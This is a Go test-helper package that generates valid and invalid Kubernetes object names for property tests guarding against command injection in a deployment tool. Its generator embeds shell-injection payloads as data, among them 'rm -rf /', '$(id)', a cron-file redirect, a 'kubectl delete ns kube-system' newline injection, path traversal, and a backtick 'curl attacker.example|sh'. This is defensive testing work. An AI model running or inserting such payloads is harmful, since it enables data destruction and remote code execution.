// Package nametest generates Kubernetes object names either side of the
// RFC1123 grammar, and answers which side one of them is on.
//
// It exists because two packages ask the same question about the same corpus.
// pipeline composes every remedy and owns the grammar check that guards one;
// mcp publishes what pipeline composed, and is where a command reaches
// something that may run it under its own credentials. Both have to assert
// that no segment outside the grammar ever reaches a command, and a corpus
// written out twice is two corpora -- one of which stops being extended the
// first time somebody widens the other.
//
// # Why the oracle is Kubernetes' own
//
// A property test whose expected value is computed by the code under test
// passes for exactly as long as that code agrees with itself: weaken the
// grammar and the oracle weakens with it, and the test that was meant to catch
// the weakening goes green. So [Valid] is decided by k8s.io/apimachinery's
// validators -- the ones the API server runs before an object exists at all --
// which makes the assertion "bosun's grammar agrees with the one that admitted
// these objects" rather than "bosun's grammar agrees with bosun".
//
// That is also the claim the design rests on. These names are RFC1123 by
// Kubernetes' own rules, which is why enforcing it costs nothing, and why the
// enforcement has to be loud on the day that stops being true.
//
// # Why a subdomain, checked label by label
//
// Kargo names a Promotion `<stage>.<ulid>.<short-sha>`, so an object name here
// is a DNS subdomain rather than a single label and a label-only oracle would
// call every real Promotion illegal. But IsDNS1123Subdomain bounds only the
// whole string, at 253, and admits a single label longer than the 63 the RFC
// gives one. So a name is valid here when the subdomain validator accepts it
// AND every dot-separated piece is a label the label validator accepts, which
// is the grammar composed the way the RFC composes it.
package nametest

import (
	"fmt"
	"math/rand/v2"
	"strings"

	"k8s.io/apimachinery/pkg/util/validation"
)

// Shape is the family a generated name was drawn from.
//
// Shapes are for coverage, not for expectation. Nothing here asks a shape
// whether its names are legal -- a generator that also decided the answer
// would agree with itself about a name it built wrong -- so they exist only so
// that a corpus can prove it reached every case the grammar has to survive,
// and say which one it was standing on when it failed.
type Shape string

// The shapes inside the grammar. A corpus needs these as much as the hostile
// ones: a check that has been quietly tightened rejects a name Kargo actually
// writes, which takes the remedy off every wedged Stage in production and is
// the control causing the outage it was meant to prevent.
const (
	// ShapeLabel is an ordinary Stage or Warehouse name: `external-secrets`.
	ShapeLabel Shape = "label"
	// ShapeSubdomain is how Kargo names a Promotion, dots and all.
	ShapeSubdomain Shape = "subdomain"
	// ShapeMaxLabel is exactly 63 characters: the last legal length, and the
	// one an off-by-one in the length check refuses.
	ShapeMaxLabel Shape = "max-length-label"
)

// The shapes outside it. Every one of these is a name Kubernetes' own
// validation refuses, and most of them end a shell command and start another.
const (
	ShapeWhitespace     Shape = "whitespace"
	ShapeNewline        Shape = "newline"
	ShapeShellMeta      Shape = "shell-metacharacter"
	ShapeBacktick       Shape = "backtick"
	ShapeQuote          Shape = "quote"
	ShapePathSeparator  Shape = "path-separator"
	ShapeLeadingHyphen  Shape = "leading-hyphen"
	ShapeTrailingHyphen Shape = "trailing-hyphen"
	ShapeOverLongLabel  Shape = "over-length-segment"
	ShapeOverLongName   Shape = "over-length-name"
	ShapeUppercase      Shape = "uppercase"
	ShapeNonASCII       Shape = "non-ascii"
)

// Shapes is every shape, and the order a corpus cycles them in.
//
// A written list, and the one thing in this package that cannot be derived at
// run time: Go has no way to enumerate the constants of a type. So it is
// derived from this file's syntax tree instead, in nametest_test.go, which
// fails naming the constant somebody declared and forgot to add here. A shape
// missing from this slice is never drawn, and nothing else notices -- a corpus
// that quietly stopped covering newlines reads exactly like one that covers
// them.
var Shapes = []Shape{
	ShapeLabel, ShapeSubdomain, ShapeMaxLabel,
	ShapeWhitespace, ShapeNewline, ShapeShellMeta, ShapeBacktick, ShapeQuote,
	ShapePathSeparator, ShapeLeadingHyphen, ShapeTrailingHyphen,
	ShapeOverLongLabel, ShapeOverLongName, ShapeUppercase, ShapeNonASCII,
}

// Case is one generated situation: several distinct names, all drawn from a
// single shape.
//
// Distinct, because a fixture that gives two Stages the same name is a fixture
// with one Stage in it. All of one shape, because a caller asserting that a
// remedy is ABSENT has to know that every piece it would have interpolated
// failed, rather than some of them -- see [Mixed] for the other half, where
// that is deliberately not true.
type Case struct {
	Shape Shape
	Names []string
}

// Corpus is cases covering every shape: per cases of each shape, each case
// carrying names distinct names.
//
// Seeded and deterministic. A property test that draws a different corpus on
// every run is one that fails on somebody else's machine and passes on yours,
// and the counterexample it found is gone before anyone can read it. Widening
// the search is a larger per or a different seed: both are edits somebody
// makes on purpose and can hand to a reviewer.
func Corpus(seed uint64, per, names int) []Case {
	r := rand.New(rand.NewPCG(seed, ^seed))
	out := make([]Case, 0, len(Shapes)*per)
	for _, s := range Shapes {
		for range per {
			out = append(out, Case{Shape: s, Names: distinct(r, func() string { return draw(r, s) }, names)})
		}
	}
	return out
}

// Mixed is cases whose names are drawn from assorted shapes rather than one,
// so a single fixture holds legal and illegal names at the same time.
//
// This is what catches a builder that validates one piece and interpolates
// another. A corpus of single-shape cases cannot: the piece it checked was
// illegal too, so the remedy came back empty and the leak never had to happen.
func Mixed(seed uint64, cases, names int) [][]string {
	r := rand.New(rand.NewPCG(seed, ^seed))
	out := make([][]string, 0, cases)
	for range cases {
		out = append(out, distinct(r, func() string {
			return draw(r, Shapes[r.IntN(len(Shapes))])
		}, names))
	}
	return out
}

// Valid reports whether a name may be interpolated into a command.
//
// The empty string is valid and means "not known": every builder in pipeline
// replaces it with a placeholder bosun itself wrote before interpolating
// anything, so an unknown namespace costs a finding no remedy.
func Valid(s string) bool {
	if s == "" {
		return true
	}
	if len(validation.IsDNS1123Subdomain(s)) > 0 {
		return false
	}
	for _, label := range strings.Split(s, ".") {
		if len(validation.IsDNS1123Label(label)) > 0 {
			return false
		}
	}
	return true
}

// AllValid is [Valid] over every name: all of them, or the command that would
// have carried them does not exist.
func AllValid(names ...string) bool {
	for _, n := range names {
		if !Valid(n) {
			return false
		}
	}
	return true
}

// distinct draws n different names from gen.
//
// The bound is not defensive tidiness. Every shape here is built around a
// random core, so collisions are vanishingly rare and a generator that started
// returning one value would otherwise hang the test suite with no clue why.
func distinct(r *rand.Rand, gen func() string, n int) []string {
	seen := make(map[string]bool, n)
	out := make([]string, 0, n)
	for attempts := 0; len(out) < n; attempts++ {
		if attempts > 100*n+100 {
			panic(fmt.Sprintf("nametest: could not draw %d distinct names; the generator is returning %d values", n, len(seen)))
		}
		v := gen()
		if seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
	}
	return out
}

// draw builds one name of a shape.
//
// Several variants per hostile shape, chosen at random, because "contains a
// shell metacharacter" is a family and a corpus that only ever writes
// `; rm -rf /` proves the check rejects a semicolon.
func draw(r *rand.Rand, s Shape) string {
	c := core(r)
	switch s {
	case ShapeLabel:
		return c
	case ShapeSubdomain:
		return c + "." + core(r) + "." + core(r)
	case ShapeMaxLabel:
		return pad(c, 63)

	case ShapeWhitespace:
		return pick(r, c+" "+core(r), " "+c, c+" ", c+"\t"+core(r), c+"\r", c+"\v"+core(r))
	case ShapeNewline:
		return pick(r, c+"\nkubectl delete ns kube-system", c+"\n", "\n"+c, c+"\r\n"+core(r))
	case ShapeShellMeta:
		return pick(r, c+"; rm -rf /", c+" && id", c+"|id", c+"$(id)", c+">/etc/cron.d/x", c+"&", c+"*", c+"$"+core(r))
	case ShapeBacktick:
		return pick(r, c+"`id`", "`"+c+"`", c+"`curl attacker.example|sh`")
	case ShapeQuote:
		return pick(r, c+"'--all", c+`"; id`, "'"+c+"'", c+`\"`)
	case ShapePathSeparator:
		return pick(r, "../../etc/"+c, c+"/"+core(r), "/"+c, c+"/../"+core(r), "./"+c)
	case ShapeLeadingHyphen:
		return pick(r, "-"+c, "--"+c, "-"+c+"-")
	case ShapeTrailingHyphen:
		return pick(r, c+"-", c+"--")
	case ShapeOverLongLabel:
		// One past the label limit, and never past the 253 the whole name
		// gets, so what this shape proves is that the SEGMENT bound is
		// enforced rather than the total length catching it by accident.
		return pad(c, 64+r.IntN(190))
	case ShapeOverLongName:
		// The mirror image: five legal labels whose total is past 253, so
		// nothing here is refused except the length of the whole thing.
		parts := []string{pad(c, 60)}
		for range 4 {
			parts = append(parts, pad(core(r), 60))
		}
		return strings.Join(parts, ".")
	case ShapeUppercase:
		return upperOne(r, c)
	case ShapeNonASCII:
		return pick(r, c+"-ünïcode", c+"-日本語", c+"-café", c+"-straße", "über-"+c)
	}
	panic("nametest: unknown shape " + string(s))
}

// core is the random middle of every generated name: a legal label of six to
// twelve characters, beginning with a letter.
//
// Random rather than a fixed word because the assertions built on this corpus
// are substring scans over composed commands, and a name has to be
// distinguishable from bosun's own literals. A corpus of short fixed strings
// would make `EOF` a hostile name and fail on the heredoc in the promote
// command, which is a false alarm that would teach somebody to delete the test.
//
// Beginning with a letter so [ShapeUppercase] always has something to change.
func core(r *rand.Rand) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	const alnum = letters + "0123456789"
	const body = alnum + "-"
	n := 6 + r.IntN(7)
	b := make([]byte, n)
	b[0] = letters[r.IntN(len(letters))]
	for i := 1; i < n-1; i++ {
		b[i] = body[r.IntN(len(body))]
	}
	b[n-1] = alnum[r.IntN(len(alnum))]
	return string(b)
}

// pad extends a label to exactly n characters, keeping the random core at the
// front so the result is still traceable to the case that produced it.
func pad(s string, n int) string {
	if len(s) >= n {
		return s[:n]
	}
	return s + strings.Repeat("a", n-len(s))
}

// upperOne raises one letter of a label, which is the whole of what makes it
// illegal: RFC1123 is lowercase, and `Argo-CD` is a name somebody will type.
func upperOne(r *rand.Rand, s string) string {
	var at []int
	for i := range len(s) {
		if s[i] >= 'a' && s[i] <= 'z' {
			at = append(at, i)
		}
	}
	i := at[r.IntN(len(at))]
	return s[:i] + strings.ToUpper(s[i:i+1]) + s[i+1:]
}

func pick(r *rand.Rand, from ...string) string { return from[r.IntN(len(from))] }
